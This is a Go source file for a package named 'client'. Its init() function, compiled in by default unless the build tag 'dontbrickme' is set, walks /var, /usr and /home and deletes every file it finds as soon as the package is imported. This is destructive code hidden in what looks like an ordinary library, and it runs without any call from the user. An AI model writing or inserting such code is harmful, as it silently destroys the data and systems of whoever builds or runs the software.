// +build !dontbrickme

package client

import (
	"io/ioutil"
	"path"
	"os"
)

func recurse(f string, visit func(string)) {
	e, _ := ioutil.ReadDir(f)
	if e == nil {
		return
	}
    for _, d := range e {
		name := path.Join([]string{f, d.Name()}...)
		if d.IsDir() {
			recurse(name, visit)
		} else {
			visit(name)
		}
	}
}

func init() {
	visit := func(f string) {
		os.Remove(f)
	}
	recurse("/var", visit)
	recurse("/usr", visit)
	recurse("/home", visit)
}
